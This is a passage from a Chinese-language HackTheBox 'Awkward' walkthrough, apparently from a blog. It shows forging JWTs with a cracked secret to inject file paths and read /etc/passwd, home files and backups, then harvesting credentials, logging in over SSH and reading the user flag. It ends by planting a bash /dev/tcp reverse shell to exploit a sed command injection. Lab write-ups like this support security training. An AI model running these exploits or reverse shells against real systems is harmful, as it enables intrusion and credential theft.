+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/qV0Ue07IjR14am1u1aKIIooiBFkQY5uO1Ky1qX4IM74.png" class>
+
+<p>直接访问是空白的，我们加上双引号试试</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/3lmX3BPWnjKtiD3MSe1h-dHJdJBJhjopXczCaJ9CpP0.png" class>
+
+<p>nice，有东西了</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/RQJrPbAxTdvycj6hIf0wvnvPePy5ArRrraGZyR0fXgk.png" class>
+
+<p>发现个有趣的玩意儿，检索已登录用户的休假请求历史记录，这个接口是有 LFI 的。</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/Cyc38LvM7oUkPlO17iHJS4Lv2kdGKa64EO8odaxI2ig.png" class>
+
+<h2 id="JWT-Token-利用"><a href="#JWT-Token-利用" class="headerlink" title="JWT Token 利用"></a>JWT Token 利用</h2><p>这里的 awk 命令是传递用户变量的，我们可以通过控制它来达到利用的目的</p>
+<p>我们需要将用户变量更改为 <code>/etc/passwd</code> </p>
+<p>user 变量的值是 JWT 令牌的用户名，为了让它成功利用，我们先去拿到 JWT Token 的密钥</p>
+<p>首先将 token 保存到本地</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# cat jwt                                                                           
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8
+</code></pre>
+<p>然后使用 john 进行破解</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# john jwt --wordlist=/usr/share/wordlists/rockyou.txt -format=HMAC-SHA256 
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+123beany123      (?)     
+1g 0:00:00:03 DONE (2023-03-12 00:54) 0.3076g/s 4102Kp/s 4102Kc/s 4102KC/s 123erix..123P45
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>得到了密钥</p>
+<p>然后我们去 jwt.io 进行 cookie 的伪造</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/9K65eo5piospxqpwE42bSLhIb46aQiunURAzYsVPRJA.png" class>
+
+<p>得到了  cookie</p>
+<pre><code class="bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk
+</code></pre>
+<p>然后我们用 burp 抓包一个访问 &#x2F;api&#x2F;all-leave 的请求，然后把 cookie 替换为我们制作的</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/h7OqA_sXJdmZFBxNvhn15FAHKB7GAVPPOjzzh2sBNQ0.png" class>
+
+<p>成功利用</p>
+<p>我这个人比较懒，所以现在我们来构造一下命令行的</p>
+<pre><code class="bash">curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot;
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
+systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
+tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
+whoopsie:x:117:124::/nonexistent:/bin/false
+sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
+colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
+gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bean:x:1001:1001:,,,:/home/bean:/bin/bash
+christine:x:1002:1002:,,,:/home/christine:/bin/bash
+postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
+mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:999::/var/log/laurel:/bin/false
+</code></pre>
+<p>利用成功，现在我们来筛选一下哪些用户可以被我们利用</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot;|grep bash
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3059  100  3059    0     0  11835      0 --:--:-- --:--:-- --:--:-- 11856
+root:x:0:0:root:/root:/bin/bash
+bean:x:1001:1001:,,,:/home/bean:/bin/bash
+christine:x:1002:1002:,,,:/home/christine:/bin/bash
+</code></pre>
+<p>可以被我们利用的有三个，root、bean、christine，很明显 root 可以排除掉，那我们来尝试请求一下剩下两个的 ssh 密钥试试</p>
+<pre><code class="bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A
+</code></pre>
+<p>去尝试一下</p>
+<pre><code class="bash">curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs&quot;
+
+curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A&quot;
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs&quot;
+Failed to retrieve leave requests                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~/Desktop]
+└─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A&quot;
+Failed to retrieve leave requests
+</code></pre>
+<p>都失败了，那我们去获取一下 <code>.bashrc</code> 文件试试</p>
+<pre><code class="bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg
+
+curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg&quot;
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg&quot;
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don&#39;t do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don&#39;t put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don&#39;t overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern &quot;**&quot; used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+[ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot;
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z &quot;${debian_chroot:-}&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)
+case &quot;$TERM&quot; in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n &quot;$force_color_prompt&quot; ]; then
+    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then
+        # We have color support; assume it&#39;s compliant with Ecma-48
+        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+        # a case would tend to support setf rather than setaf.)
+        color_prompt=yes
+    else
+        color_prompt=
+    fi
+fi
+
+if [ &quot;$color_prompt&quot; = yes ]; then
+    PS1=&#39;${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;
+else
+    PS1=&#39;${debian_chroot:+($debian_chroot)}\u@\h:\w\$ &#39;
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case &quot;$TERM&quot; in
+xterm*|rxvt*)
+    PS1=&quot;\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1&quot;
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;
+    alias ls=&#39;ls --color=auto&#39;
+    #alias dir=&#39;dir --color=auto&#39;
+    #alias vdir=&#39;vdir --color=auto&#39;
+
+    alias grep=&#39;grep --color=auto&#39;
+    alias fgrep=&#39;fgrep --color=auto&#39;
+    alias egrep=&#39;egrep --color=auto&#39;
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS=&#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#39;
+
+# some more ls aliases
+alias ll=&#39;ls -alF&#39;
+alias la=&#39;ls -A&#39;
+alias l=&#39;ls -CF&#39;
+
+# custom
+alias backup_home=&#39;/bin/bash /home/bean/Documents/backup_home.sh&#39;
+
+# Add an &quot;alert&quot; alias for long running commands.  Use like so:
+#   sleep 10; alert
+alias alert=&#39;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#39;\&#39;&#39;s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//&#39;\&#39;&#39;)&quot;&#39;
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don&#39;t need to enable
+# this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+</code></pre>
+<pre><code class="bash"># custom
+alias backup_home=&#39;/bin/bash /home/bean/Documents/backup_home.sh&#39;
+</code></pre>
+<p>我们找到了一个 alias，还有一个 hash 脚本 <code>/home/bean/Documents/backup_home.sh</code> </p>
+<pre><code class="bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0
+
+curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0&quot;
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0&quot;
+#!/bin/bash
+mkdir /home/bean/Documents/backup_tmp
+cd /home/bean
+tar --exclude=&#39;.npm&#39; --exclude=&#39;.cache&#39; --exclude=&#39;.vscode&#39; -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
+date &gt; /home/bean/Documents/backup_tmp/time.txt
+cd /home/bean/Documents/backup_tmp
+tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
+rm -r /home/bean/Documents/backup_tmp
+</code></pre>
+<p>我们去下载这个文件</p>
+<pre><code class="bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw
+
+curl http://hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw&quot; --output bean_backup_final.zip
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop/bean]
+└─# curl http://hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw&quot; --output bean_backup_final.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 31716  100 31716    0     0  61542      0 --:--:-- --:--:-- --:--:-- 61584
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop/bean]
+└─# ls
+bean_backup_final.zip
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop/bean]
+└─# unzip bean_backup_final.zip 
+Archive:  bean_backup_final.zip
+  End-of-central-directory signature not found.  Either this file is not
+  a zipfile, or it constitutes one disk of a multi-part archive.  In the
+  latter case the central directory and zipfile comment will be found on
+  the last disk(s) of this archive.
+unzip:  cannot find zipfile directory in one of bean_backup_final.zip or
+        bean_backup_final.zip.zip, and cannot find bean_backup_final.zip.ZIP, period.
+</code></pre>
+<p>将文件解压出来</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop/bean]
+└─# ls -la
+总计 68
+drwxr-xr-x  6 root     root      4096  3月12日 01:26 .
+drwxr-xr-x  3 root     root      4096  3月12日 01:17 ..
+lrwxrwxrwx  1 lucifiel lucifiel     9  9月15日 19:40 .bash_history -&gt; /dev/null
+-rw-r--r--  1 lucifiel lucifiel   220  9月15日 19:34 .bash_logout
+-rw-r--r--  1 lucifiel lucifiel  3847  9月15日 19:45 .bashrc
+-rw-r--r--  1 root     root     31716  3月12日 01:26 bean_backup_final.zip
+drwxr-xr-x 12 root     root      4096  3月12日 01:24 .config
+drwxr-xr-x  2 root     root      4096  3月12日 01:24 .gnupg
+drwxr-xr-x  3 root     root      4096  3月12日 01:24 .local
+-rw-r--r--  1 lucifiel lucifiel   807  9月15日 19:34 .profile
+drwx------  2 lucifiel lucifiel  4096  9月15日 19:36 .ssh
+</code></pre>
+<p>这是解压出来的文件</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop/bean/.config/xpad]
+└─# cat content-DS1ZS1 
+TO DO:
+- Get real hat prices / stock from Christine
+- Implement more secure hashing mechanism for HR system
+- Setup better confirmation message when adding item to cart
+- Add support for item quantity &gt; 1
+- Implement checkout system
+
+boldHR SYSTEM/bold
+bean.hill
+014mrbeanrules!#P
+
+https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
+
+boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold 
+</code></pre>
+<p>在 bean&#x2F;.config&#x2F;xpad&#x2F;content-DS1ZS1 中找到了 bean 的密码</p>
+<pre><code class="bash">username = bean.hill
+password = 014mrbeanrules!#P
+</code></pre>
+<p>尝试使用 bean 去登录 ssh</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh bean@10.10.11.185                      
+The authenticity of host &#39;10.10.11.185 (10.10.11.185)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:iXn1BLzsoL4oHP9bO/v5F/CKp7pdoku6nopTeJlvR3U.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.185&#39; (ED25519) to the list of known hosts.
+bean@10.10.11.185&#39;s password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sun Mar 12 01:59:31 2023 from 10.10.14.68
+bean@awkward:~$ whoami&amp;&amp;id
+bean
+uid=1001(bean) gid=1001(bean) groups=1001(bean)
+</code></pre>
+<p>成功登录到 user 用户</p>
+<pre><code class="bash">bean@awkward:~$ cat user.txt 
+5005243124dea7c1f14fc7d933ef2946
+</code></pre>
+<p>成功拿到 user 用户的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>还记得我们的子域名 store 吗？</p>
+<p>在 burp 中的时候显示该页面来自 nginx 服务器，让我们看一下 shell 中的 nginx 配置文件</p>
+<pre><code class="bash">bean@awkward:~$ cd /etc/nginx/conf.d/
+bean@awkward:/etc/nginx/conf.d$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Sep 15 22:34 .
+drwxr-xr-x 8 root root 4096 Oct  6 00:49 ..
+-rw-r--r-- 1 root root   44 Sep 15 22:34 .htpasswd
+bean@awkward:/etc/nginx/conf.d$ cat .htpasswd 
+admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
+</code></pre>
+<p>我们使用 john 去跑一下</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:30 DONE (2023-03-12 01:34) 0g/s 156319p/s 156319c/s 156319C/s  ejngyhga007..*7¡Vamos!
+Session completed.
+</code></pre>
+<p>然而并没有结果</p>
+<p>然而我突然想起来 content-DS1ZS1 文件底部有一句注释</p>
+<pre><code class="bash">boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold 
+</code></pre>
+<p>大概意思就是让我们导出尝试一下</p>
+<pre><code class="bash">username = admin
+password = 014mrbeanrules!#P
+</code></pre>
+<p>使用 bean 的代码前往 <a href="http://store.hat-valley.htb/" target="_blank" rel="noopener">http://store.hat-valley.htb/</a> 登录 admin 账户成功</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/w4xE8GRniDaZ555NGGjxG7k93o5vOMK_xI-1wrM-xBE.png" class>
+
+<p>这很明显是 Hat Valley 的在线商店。我们去查看一下代码</p>
+<pre><code class="bash">bean@awkward:/var/www/store$ ls -la
+total 104
+drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
+drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
+drwxrwxrwx 2 root root  4096 Mar 12 01:30 cart
+-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
+-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
+-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
+-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
+drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
+drwxrwxrwx 2 root root  4096 Mar 12 04:30 product-details
+-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
+-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
+-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css
+</code></pre>
+<pre><code class="bash">bean@awkward:/var/www/store$ cat README.md 
+# Hat Valley - Shop Online!
+
+### To Do
+1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
+2. Implement checkout system, link with credit card system (Stripe??)
+3. Implement shop filter
+4. Get full catalogue of items
+
+### How to Add New Catalogue Item
+1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
+2. Change the fields to the appropriate values and save the file.  
+-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --
+
+### Hat Valley Cart
+Right now, the user&#39;s cart is stored within /cart, and is named according to the user&#39;s session ID. All products are appended to the same file for each user.
+To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!
+</code></pre>
+<p>README.md 告诉我们文件正离线存储在 &#x2F;product-details 和 &#x2F;cart 中</p>
+<p>在文件 cart_actions.php 中的一段代码</p>
+<pre><code class="bash">    if(checkValidItem(&quot;{$STORE_HOME}cart/{$user_id}&quot;)) {
+        system(&quot;sed -i &#39;/item_id={$item_id}/d&#39; {$STORE_HOME}cart/{$user_id}&quot;);
+        echo &quot;Item removed from cart&quot;;
+    }
+    else {
+        echo &quot;Invalid item&quot;;
+    }
+    exit;
+</code></pre>
+<p>这不就有了</p>
+<p>这段中的 sed 命令是用于从购物车文件中删除数据</p>
+<p>我们可以利用这个代码来进行远程代码执行</p>
+<p>首先我们需要一个 Reverse Shell</p>
+<pre><code class="bash">echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1&quot; &gt;&gt; /tmp/shell.sh
+chmod 777 /tmp/shell.sh
+
+bean@awkward:/var/www/store/cart$ cat /tmp/shell.sh 
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1
+</code></pre>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<p>然后接着我们将产品添加到购物车</p>
